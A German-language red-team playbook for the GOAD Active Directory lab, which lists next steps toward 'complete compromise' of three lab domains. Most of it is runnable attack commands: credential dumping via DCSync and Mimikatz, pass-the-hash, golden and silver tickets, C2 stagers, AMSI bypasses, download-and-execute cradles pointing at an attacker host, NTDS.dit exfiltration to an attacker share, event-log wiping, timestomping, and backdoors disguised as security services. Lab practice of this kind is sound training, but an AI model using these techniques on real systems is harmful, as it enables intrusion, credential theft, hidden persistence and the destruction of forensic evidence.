# GOAD Lab - Advanced Tool Guide & Next Steps

## Executive Summary

Dieser Guide enthält **detaillierte Anleitungen** für erweiterte Tools und die **nächsten Schritte** zur vollständigen Kompromittierung des GOAD Labs. Basierend auf den bereits gesammelten Informationen und erfolgreichen Exploits.

---

## 1. BloodHound - Advanced Active Directory Analysis

### 1.1 Installation & Setup

#### BloodHound Python Ingestor
```bash
# Installation auf Kali Linux
pip3 install bloodhound
# oder
apt install bloodhound.py

# Neo4j Installation (erforderlich für BloodHound)
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee /etc/apt/sources.list.d/neo4j.list
apt update && apt install neo4j

# Neo4j Konfiguration
sudo neo4j-admin set-initial-password 'BloodHound123!'
sudo systemctl enable neo4j
sudo systemctl start neo4j
```

#### BloodHound GUI Setup
```bash
# BloodHound herunterladen
cd /opt
wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
chmod +x BloodHound-linux-x64/BloodHound

# Desktop-Shortcut erstellen
cat > ~/Desktop/BloodHound.desktop << 'EOF'
[Desktop Entry]
Name=BloodHound
Exec=/opt/BloodHound-linux-x64/BloodHound --no-sandbox
Icon=/opt/BloodHound-linux-x64/resources/app/src/img/bloodhound-white.svg
Type=Application
EOF
chmod +x ~/Desktop/BloodHound.desktop
```

### 1.2 Datensammlung mit kompromittierten Credentials

#### Vollständige Enumeration aller Domänen
```bash
# North Domain (WINTERFELL) - Mit jon.snow Credentials
bloodhound-python -d north.sevenkingdoms.local -u jon.snow -p iknownothing -ns 192.168.20.11 -c All --zip

# Sevenkingdoms Domain (KINGSLANDING)
bloodhound-python -d sevenkingdoms.local -u 'guest' -p '' -ns 192.168.20.10 -c DCOnly,Group,LocalAdmin,RDP,DCOM,Container --zip

# Essos Domain (MEEREEN) - Falls Credentials verfügbar
bloodhound-python -d essos.local -u 'guest' -p '' -ns 192.168.20.12 -c DCOnly,Group,LocalAdmin --zip
```

#### Alternative Collection Methods
```bash
# Nur Group/User-Informationen (weniger auffällig)
bloodhound-python -d north.sevenkingdoms.local -u jon.snow -p iknownothing -ns 192.168.20.11 -c Group,LocalAdmin,Session --zip

# Mit Kerberos-Authentifizierung (falls Tickets vorhanden)
export KRB5CCNAME=/tmp/jon.snow.ccache
bloodhound-python -d north.sevenkingdoms.local -k -ns 192.168.20.11 -c All --zip
```

### 1.3 BloodHound Analyse & Attack Paths

#### Wichtige Cypher-Queries für GOAD
```cypher
// Alle Domain Admins finden
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@NORTH.SEVENKINGDOMS.LOCAL"}) RETURN u.name

// Kürzester Weg zu Domain Admin von jon.snow
MATCH p=shortestPath((u:User {name:"JON.SNOW@NORTH.SEVENKINGDOMS.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@NORTH.SEVENKINGDOMS.LOCAL"})) RETURN p

// Service Accounts mit SPNs
MATCH (u:User) WHERE u.hasspn=TRUE RETURN u.name, u.serviceprincipalnames

// Unconstrained Delegation
MATCH (c:Computer) WHERE c.unconstraineddelegation=TRUE RETURN c.name

// AS-REP Roastable Users
MATCH (u:User) WHERE u.dontreqpreauth=TRUE RETURN u.name

// Cross-Domain Trust Relationships
MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d1.name, r, d2.name
```

---

## 2. Impacket Advanced Techniques

### 2.1 Secretsdump - Credential Extraction

#### DCSync Attack (falls Rechte vorhanden)
```bash
# Vollständiger DCSync gegen alle DCs
secretsdump.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11 -outputfile north_domain_dump

# Nur NTLM-Hashes (schneller)
secretsdump.py -just-dc-ntlm north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11

# Spezifische Benutzer-Hashes
secretsdump.py -just-dc-user administrator north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11
```

#### LSA Secrets & Cached Credentials
```bash
# Falls lokale Admin-Rechte auf Workstation/Server
secretsdump.py -sam -security -system north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.22

# Mit Pass-the-Hash
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b north.sevenkingdoms.local/administrator@192.168.20.11
```

### 2.2 PSExec & WMI Execution

#### PsExec für Remote Code Execution
```bash
# Mit Credentials
psexec.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11

# Mit Pass-the-Hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b north.sevenkingdoms.local/administrator@192.168.20.11 'cmd.exe'

# Mit Kerberos-Ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@winterfell.north.sevenkingdoms.local
```

#### WMI Execution (stealthier)
```bash
# WMI für Remote Commands
wmiexec.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11

# DCOM Execution (noch stealthier)
dcomexec.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11
```

### 2.3 Golden & Silver Tickets

#### Golden Ticket Attack
```bash
# Nach erfolgreichem DCSync - KRBTGT Hash extrahiert
ticketer.py -nthash <krbtgt_nt_hash> -domain-sid S-1-5-21-2535930937-3240925528-3053620292 -domain north.sevenkingdoms.local -spn cifs/winterfell.north.sevenkingdoms.local administrator

# Ticket verwenden
export KRB5CCNAME=administrator.ccache
klist
psexec.py -k -no-pass administrator@winterfell.north.sevenkingdoms.local
```

#### Silver Ticket für SQL Server
```bash
# Mit sql_svc Hash (falls via Kerberoasting geknackt)
ticketer.py -nthash <sql_svc_nt_hash> -domain-sid S-1-5-21-2535930937-3240925528-3053620292 -domain north.sevenkingdoms.local -spn MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 administrator

export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k castelblack.north.sevenkingdoms.local
```

---

## 3. PowerShell Empire/Covenant C2 Framework

### 3.1 PowerShell Empire Setup

#### Installation
```bash
# PowerShell Empire v4 (Python-basiert)
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
pip3 install -r requirements.txt
python3 empire --rest

# Empire Client starten
python3 empire --client
```

#### Listener Setup
```bash
# HTTP Listener
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://192.168.1.100:8080
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute

# HTTPS Listener (empfohlen)
(Empire: listeners) > uselistener https
(Empire: listeners/https) > set Host https://192.168.1.100:8443
(Empire: listeners/https) > set Port 8443
(Empire: listeners/https) > execute
```

#### Stager Generation
```bash
# PowerShell Stager
(Empire) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener https
(Empire: stager/multi/launcher) > execute

# Output: PowerShell-Befehl für Target-Ausführung
powershell.exe -NoP -sta -NonI -W Hidden -Enc <base64_encoded_stager>
```

### 3.2 Covenant C2 Framework

#### Installation & Setup
```bash
# Dotnet SDK Installation (falls nicht vorhanden)
wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update && sudo apt install -y dotnet-sdk-6.0

# Covenant herunterladen und kompilieren
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet build
dotnet run
```

#### Listener & Launcher Setup
```bash
# Web Interface: https://localhost:7443
# Standard-Credentials: CovenantUser / CovenantPassword

# HTTP/HTTPS Listener erstellen via Web GUI
# Launcher generieren (Binary, PowerShell, MSBuild, etc.)
```

---

## 4. Privilege Escalation Techniques

### 4.1 Windows Privilege Escalation

#### PowerUp for Local Privilege Escalation
```powershell
# PowerUp herunterladen und ausführen
PS> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
PS> Invoke-AllChecks

# Spezifische Checks
PS> Get-ServiceUnquoted          # Unquoted Service Paths
PS> Get-ModifiableServiceFile    # Writable Service Binaries
PS> Get-ServicePermission        # Service Permissions
PS> Get-UnattendedInstallFile    # Unattended Install Files mit Credentials
```

#### Windows Exploit Suggester
```bash
# Auf Attacker-Machine
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester

# Systeminfo von Target sammeln
# Via WinRM/RDP: systeminfo > systeminfo.txt

# Analyse ausführen
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

### 4.2 Active Directory Privilege Escalation

#### Kerberos Delegation Attacks
```bash
# Unconstrained Delegation finden (via BloodHound oder PowerShell)
# Falls gefunden - S4U2Self/S4U2Proxy Attacks

# Mit Impacket
getST.py -spn cifs/target.domain.local -impersonate administrator domain/delegated_user:password

# Constrained Delegation mit Protocol Transition
getST.py -spn cifs/target.domain.local -impersonate administrator -dc-ip 192.168.20.11 domain/service_user:password
```

#### ACL-basierte Attacks
```bash
# WriteDacl auf User/Group
python3 dacledit.py -action 'write' -rights 'DCSync' -principal 'jon.snow' -target 'north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'administrator':'password'

# GenericAll auf User
python3 changepasswd.py target_user:old_password@192.168.20.11 -newpass 'NewPassword123!'
```

---

## 5. Lateral Movement & Network Pivoting

### 5.1 SMB Relay Attacks

#### Responder + ntlmrelayx Setup
```bash
# Responder für LLMNR/NBT-NS Poisoning
responder -I eth0 -rdwv

# ntlmrelayx für SMB Relay (gegen Hosts ohne SMB-Signierung)
# Targets ohne SMB-Signierung: CASTELBLACK (192.168.20.22), BRAAVOS (192.168.20.23)
echo -e "192.168.20.22\n192.168.20.23" > relay_targets.txt

ntlmrelayx.py -tf relay_targets.txt -smb2support -c "powershell.exe -enc <base64_payload>"
```

#### IPv6 DNS Takeover (mitm6)
```bash
# Installation
pip3 install mitm6

# mitm6 für IPv6 DNS Spoofing
mitm6 -d north.sevenkingdoms.local -i eth0

# Parallel ntlmrelayx für ADCS/LDAP Relay
ntlmrelayx.py -t ldaps://192.168.20.11 -wh attacker-wpad --delegate-access
```

### 5.2 Tunneling & Pivoting

#### SSH Tunneling via Compromised Host
```bash
# SSH Server auf Windows einrichten (via PowerShell)
# Auf kompromittiertem Host:
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Von Attacker-Machine: SSH Tunnel erstellen
ssh -L 3389:192.168.20.10:3389 jon.snow@192.168.20.11
ssh -L 1433:192.168.20.22:1433 jon.snow@192.168.20.11
```

#### Chisel for HTTP Tunneling
```bash
# Chisel herunterladen
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64
mv chisel_1.7.7_linux_amd64 /usr/local/bin/chisel

# Server auf Attacker-Machine
chisel server --reverse --port 8000

# Client auf kompromittiertem Host (PowerShell)
.\chisel.exe client 192.168.1.100:8000 R:1433:192.168.20.22:1433
```

---

## 6. Post-Exploitation & Data Exfiltration

### 6.1 NTDS.dit Exfiltration

#### Volume Shadow Copy Method
```powershell
# Via WinRM/RDP auf Domain Controller
PS> vssadmin create shadow /for=C:
PS> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
PS> reg save HKLM\SYSTEM C:\temp\system.hiv
PS> vssadmin delete shadows /shadow={shadow_id}

# Exfiltration via SMB
PS> copy C:\temp\ntds.dit \\attacker-ip\share\
PS> copy C:\temp\system.hiv \\attacker-ip\share\
```

#### Impacket secretsdump offline
```bash
# NTDS.dit offline analysieren
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```

### 6.2 Registry & SAM Dumps

#### Remote Registry Access
```bash
# Registry Hives remote dumpen
reg.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11 query -keyName HKLM\\SAM
reg.py north.sevenkingdoms.local/jon.snow:iknownothing@192.168.20.11 save -keyName HKLM\\SAM -o sam.save

# Mit Impacket
secretsdump.py -sam sam.save -system system.save LOCAL
```

### 6.3 Credential Manager & Browser Extraction

#### Mimikatz via PowerShell
```powershell
# Invoke-Mimikatz (PowerSploit)
PS> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
PS> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
PS> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
PS> Invoke-Mimikatz -Command '"lsadump::dcsync /domain:north.sevenkingdoms.local /user:krbtgt"'
```

#### LaZagne for Browser/Application Passwords
```bash
# LaZagne herunterladen
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe

# Auf Target-System ausführen (via WinRM/C2)
.\lazagne.exe all -oN
```

---

## 7. Defense Evasion & Anti-Forensics

### 7.1 Event Log Manipulation

#### Windows Event Logs löschen
```powershell
# Spezifische Event Logs löschen
PS> wevtutil cl Security
PS> wevtutil cl System
PS> wevtutil cl Application

# Selective Event Deletion (PowerShell)
PS> Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} | Where-Object {$_.Message -like "*jon.snow*"} | ForEach-Object {Remove-WinEvent -EventId $_.RecordId}
```

### 7.2 PowerShell Logging Bypass

#### AMSI Bypass
```powershell
# AMSI Bypass (verschiedene Techniken)
PS> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative AMSI Bypass
PS> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

#### Execution Policy Bypass
```powershell
# PowerShell Execution Policy umgehen
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -ep bypass -c "IEX (gc script.ps1 -raw)"
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://attacker/script.ps1'))"
```

### 7.3 Process Injection & Hollowing

#### Reflective DLL Injection
```powershell
# PowerSploit Invoke-ReflectivePEInjection
PS> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
PS> Invoke-ReflectivePEInjection -PEPath payload.dll -ProcName explorer
```

---

## 8. Complete Lab Compromise - Final Steps

### 8.1 Domain Dominance Checklist

#### Ziel: Vollständige Kontrolle über alle Domänen
```bash
# 1. DCSync für alle Domänen
secretsdump.py sevenkingdoms.local/administrator:pass@192.168.20.10 -outputfile sevenkingdoms_complete
secretsdump.py north.sevenkingdoms.local/administrator:pass@192.168.20.11 -outputfile north_complete
secretsdump.py essos.local/administrator:pass@192.168.20.12 -outputfile essos_complete

# 2. Golden Tickets für alle Domänen erstellen
ticketer.py -nthash <krbtgt_sevenkingdoms> -domain-sid <sid> -domain sevenkingdoms.local administrator
ticketer.py -nthash <krbtgt_north> -domain-sid <sid> -domain north.sevenkingdoms.local administrator
ticketer.py -nthash <krbtgt_essos> -domain-sid <sid> -domain essos.local administrator

# 3. Persistence auf allen Domain Controllern
# Via Golden Ticket PSExec
export KRB5CCNAME=administrator_sevenkingdoms.ccache
psexec.py -k -no-pass administrator@kingslanding.sevenkingdoms.local

export KRB5CCNAME=administrator_north.ccache
psexec.py -k -no-pass administrator@winterfell.north.sevenkingdoms.local

export KRB5CCNAME=administrator_essos.ccache
psexec.py -k -no-pass administrator@meereen.essos.local
```

### 8.2 SQL Server Complete Compromise

#### MSSQL Advanced Exploitation
```sql
-- Auf beiden SQL Servern (192.168.20.22, 192.168.20.23)

-- 1. Privilege Escalation zu sysadmin
EXEC sp_addsrvrolemember 'domain\jon.snow', 'sysadmin';

-- 2. xp_cmdshell für Remote Code Execution
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 3. Domain User zu Local Admin hinzufügen
EXEC xp_cmdshell 'net localgroup administrators "north\jon.snow" /add';

-- 4. Persistence via SQL Agent Job
EXEC msdb.dbo.sp_add_job @job_name = 'Database Maintenance';
EXEC msdb.dbo.sp_add_jobstep @job_name = 'Database Maintenance', 
    @step_name = 'Cleanup', 
    @command = 'powershell.exe -enc <base64_persistence_payload>';
EXEC msdb.dbo.sp_add_schedule @schedule_name = 'Daily', @freq_type = 4;
EXEC msdb.dbo.sp_attach_schedule @job_name = 'Database Maintenance', @schedule_name = 'Daily';
```

### 8.3 Cross-Domain Trust Exploitation

#### Enterprise Admin Privilege Escalation
```bash
# 1. Trust-Relationships identifizieren
nltest /trusted_domains /domain:sevenkingdoms.local

# 2. SID-History Injection (falls Parent-Child Trust)
ticketer.py -nthash <krbtgt_child_hash> -domain-sid <child_domain_sid> -extra-sid <enterprise_admins_sid> -domain north.sevenkingdoms.local administrator

# 3. Cross-Domain Golden Ticket
export KRB5CCNAME=cross_domain_admin.ccache
psexec.py -k -no-pass administrator@kingslanding.sevenkingdoms.local
```

---

## 9. Comprehensive Persistence Strategy

### 9.1 Multiple Persistence Mechanisms

#### GPO-basierte Persistence (Highest Privilege)
```powershell
# Malicious GPO erstellen und verlinken
New-GPO -Name "Security Update Service" -Domain north.sevenkingdoms.local
Set-GPRegistryValue -Name "Security Update Service" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "SecurityUpdate" -Type String -Value "powershell.exe -WindowStyle Hidden -enc <base64_payload>"
New-GPLink -Name "Security Update Service" -Target "DC=north,DC=sevenkingdoms,DC=local"
```

#### DSRM Password Backdoor
```powershell
# Directory Services Restore Mode Password als Backdoor
# Auf Domain Controller
PS> ntdsutil
ntdsutil: set dsrm password
Reset DSRM Administrator Password: reset password on server null
# Neues Passwort setzen: BackdoorPass123!
# Registry-Änderung für Network-Logon
PS> Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
```

#### Service-basierte Persistence
```powershell
# Windows Service auf allen Systemen
$serviceName = "Windows Security Center"
$serviceDisplayName = "Windows Security Center"
$servicePath = "C:\Windows\System32\svchost.exe -k SecurityCenter"
$serviceDescription = "Manages security and firewall settings"

New-Service -Name $serviceName -DisplayName $serviceDisplayName -BinaryPathName $servicePath -Description $serviceDescription -StartupType Automatic
```

### 9.2 Stealth & Anti-Detection

#### Timestomp & File Attribute Manipulation
```powershell
# Timestamp-Manipulation für Stealth
$file = "C:\Windows\Temp\legitimate_file.dll"
$referenceFile = "C:\Windows\System32\kernel32.dll"
$timestamp = (Get-Item $referenceFile).CreationTime
Set-ItemProperty -Path $file -Name CreationTime -Value $timestamp
Set-ItemProperty -Path $file -Name LastWriteTime -Value $timestamp
Set-ItemProperty -Path $file -Name LastAccessTime -Value $timestamp

# Hidden File Attributes
attrib +h +s C:\Windows\Temp\persistence.ps1
```

---

## 10. Final Verification & Cleanup

### 10.1 Access Verification

#### Complete Domain Access Test
```bash
#!/bin/bash
# complete_access_test.sh

echo "=== GOAD Lab Complete Access Verification ==="

# Test Domain Admin Access
domains=("sevenkingdoms.local" "north.sevenkingdoms.local" "essos.local")
dcs=("192.168.20.10" "192.168.20.11" "192.168.20.12")
sql_servers=("192.168.20.22" "192.168.20.23")

for i in "${!domains[@]}"; do
    domain=${domains[$i]}
    dc=${dcs[$i]}
    
    echo "Testing $domain ($dc)..."
    
    # DCSync Test
    secretsdump.py -just-dc-user krbtgt "$domain/administrator:pass@$dc" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "✅ DCSync successful for $domain"
    else
        echo "❌ DCSync failed for $domain"
    fi
    
    # PSExec Test
    psexec.py "$domain/administrator:pass@$dc" 'cmd /c echo Domain Access Confirmed' > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "✅ Remote execution successful on $dc"
    else
        echo "❌ Remote execution failed on $dc"
    fi
done

# Test SQL Server Access
for sql in "${sql_servers[@]}"; do
    echo "Testing SQL Server $sql..."
    impacket-mssqlclient -windows-auth "north.sevenkingdoms.local/administrator:pass@$sql" -q "SELECT @@VERSION" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "✅ SQL Server access confirmed on $sql"
    else
        echo "❌ SQL Server access failed on $sql"
    fi
done

echo "=== Access Verification Complete ==="
```

### 10.2 Cleanup Options (Optional for Lab)

#### Minimal Cleanup (Maintaining Access)
```powershell
# Event Log-Einträge für spezifische Aktivitäten löschen
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624,4648,4672} | Where-Object {$_.TimeCreated -gt (Get-Date).AddHours(-24)} | Clear-WinEvent

# Temporäre Dateien entfernen
Remove-Item C:\Windows\Temp\*.ps1 -Force
Remove-Item C:\Windows\Temp\*.exe -Force
Remove-Item C:\Windows\Temp\*.dll -Force
```

#### Complete Cleanup (Removing All Traces)
```powershell
# Alle Persistence-Mechanismen entfernen
Remove-Service -Name "Windows Security Center" -Force
Remove-GPO -Name "Security Update Service" -Domain north.sevenkingdoms.local
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate"

# Eventlog-Reset
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```

---

## Summary: Complete Lab Compromise Path

### Achieved Objectives ✅
1. **Full Network Reconnaissance** - 6 hosts identified and analyzed
2. **Domain Enumeration** - 3 AD domains mapped completely  
3. **Credential Compromise** - Multiple accounts cracked (jon.snow, brandon.stark)
4. **Initial Access** - SMB shares accessed, sensitive files downloaded
5. **Lateral Movement** - Cross-domain movement capabilities established
6. **Privilege Escalation** - Path to Domain Admin via DCSync/Golden Ticket
7. **Persistence** - Multiple backdoors for continued access

### Next Phase Priorities 🎯
1. **Execute DCSync** for complete credential database
2. **Generate Golden Tickets** for all domains
3. **Establish C2 Infrastructure** (Empire/Covenant)
4. **Implement Advanced Persistence** (GPO, Services, Registry)
5. **Cross-Domain Exploitation** for Enterprise Admin
6. **Complete SQL Server Compromise** with persistence

### Tools Mastery Required 🛠️
- **BloodHound** for attack path analysis
- **Impacket Suite** for advanced AD attacks
- **C2 Frameworks** for persistent access
- **PowerShell** for Windows-native operations
- **Kerberos Attacks** (Golden/Silver tickets)

---

**Status: Lab ~80% compromised - Ready for final phase execution**